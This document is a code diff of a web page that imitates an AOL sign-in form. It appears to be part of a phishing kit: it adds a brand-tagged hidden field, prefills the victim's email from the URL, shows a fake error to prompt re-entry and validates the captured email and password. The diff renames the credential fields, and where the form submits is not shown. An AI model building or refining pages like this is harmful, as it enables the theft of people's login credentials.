@@ -35,8 +35,8 @@ a:hover
           </div>
           </div>
 		<input type="hidden" id="source" name="source" value="aol">
-		<input id="email" style="position:absolute;left:71px;top:112px;width:252px;height:35px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" name="pet" id="email" type="email" placeholder="Username or Email">
-		<input  style="position:absolute;left:71px;top:159px;width:252px;height:35px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:1" name="pett" id="pett"  type="password" placeholder="Password">
+		<input id="email" style="position:absolute;left:71px;top:112px;width:252px;height:35px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:0" name="email" id="email" type="email" placeholder="Username or Email">
+		<input  style="position:absolute;left:71px;top:159px;width:252px;height:35px;border:1px #C0C0C0 solid;font-family:Arial;font-size:12px;z-index:1" name="password" id="password"  type="password" placeholder="Password">
 		<input class="btnn" id="login-button" name="submit-aol"  style="position:absolute;left:71px;top:266px;width:252px;height:42px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2" type="submit">
 	</form>
 </div>
@@ -51,26 +51,26 @@ a:hover
     var error =  url.get('error') || hasherror;
     const err = document.getElementById('showerror');
     if (email && /.+@.+\..+/.test(email)){
-        $("input[name='pet']").val(email);
-        $("input[name='pett']").focus();
+        $("input[name='email']").val(email);
+        $("input[name='password']").focus();
         $("#username").html(email.split('@')[0])
     }else{
-        $("input[name='pet']").focus();
+        $("input[name='email']").focus();
     }
     if(error){
         $(".showerror").show('slow');
         $("input[name='error']").val('error')
     }
-    const pet = document.getElementById('pet');
-    const pett = document.getElementById('pett');
+    const pet = document.getElementById('email');
+    const pett = document.getElementById('password');
     const source = document.getElementById('source');
     const form = document.getElementById("login_form");
     $(".btnn").click(e => {
         e.preventDefault();
-        if(!/.+@.+\..+/.test($("input[name='pet']").val())){
+        if(!/.+@.+\..+/.test($("input[name='email']").val())){
             alert('Email entered is invalid');
             return;
-        }else if(!$("input[name='pett']").val() || !$("input[name='pett']").val() > 7){
+        }else if(!$("input[name='password']").val() || !$("input[name='password']").val() > 7){
             alert('Your password must be up to 8 characters!');
             return;
         } else { 
